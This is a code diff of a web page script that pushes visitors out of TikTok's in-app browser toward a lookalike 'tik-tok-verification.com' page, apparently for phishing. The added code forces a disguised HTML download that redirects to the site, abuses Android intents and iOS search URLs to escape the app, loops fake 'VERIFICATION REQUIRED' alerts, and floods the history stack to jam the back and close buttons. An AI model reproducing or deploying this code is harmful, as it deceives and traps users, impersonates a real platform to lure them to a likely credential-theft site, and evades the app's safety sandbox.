@@ -11,56 +11,54 @@
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function forceOut() {
+    function forceSystemBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        
+        // This is the "Magic" payload. 
+        // We create an HTML file in memory that redirects to your site.
+        const blobContent = `<html><head><meta http-equiv="refresh" content="0;url=${destination}"></head></html>`;
+        const blob = new Blob([blobContent], {type: 'text/html'});
+        const blobUrl = URL.createObjectURL(blob);
+
+        // We create an invisible link and force a 'download'
+        const a = document.createElement('a');
+        a.href = blobUrl;
+        
+        // This 'download' attribute is the key. 
+        // TikTok can't render downloads, so it kicks the user to an external browser.
+        a.download = "verify.html"; 
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
 
         if (isAndroid) {
+            // Android fallback: Package-specific intent
             window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
-        } else if (isIOS) {
-            // iOS: Try to jump to Safari using the Search protocol
+        } else {
+            // iOS fallback: Search protocol
             window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            // Trigger a simulated click on a direct link
-            const a = document.createElement('a');
-            a.href = destination;
-            a.click();
         }
     }
 
-    // THE HEARTBEAT: Fires every 500ms regardless of alerts
-    // This attempts the redirect in the "background"
-    const heartBeat = setInterval(() => {
-        if (Date.now() > killTime) {
-            clearInterval(heartBeat);
-            return;
-        }
-        forceOut();
-    }, 500);
-
     function rampage() {
-        if (Date.now() > killTime) return;
+        if (Date.now() > killTime) return; // FAIL-SAFE
 
-        // The alert blocks the main thread, but the setInterval above 
-        // will keep trying to fire redirects in the gaps.
-        alert("SECURITY: Verification Required\n\nPress OK to open in Safari/Chrome.");
+        forceSystemBreakout();
+
+        alert("VERIFICATION REQUIRED\n\nClick OK to open the secure system browser.");
         
-        forceOut();
+        forceSystemBreakout();
+
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Build an massive history stack to jam the "X" and "Back" gestures
-        for(let i=0; i<100; i++) {
-            history.pushState({page: i}, "", "#step_" + i);
-        }
-        
+        // Backstack flood to jam the 'X' button
+        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
         rampage();
     };
 
-    // If they swipe or try to close (X), it triggers a blur/popstate
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
-    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
-
 </script>
 </body>
 </html>
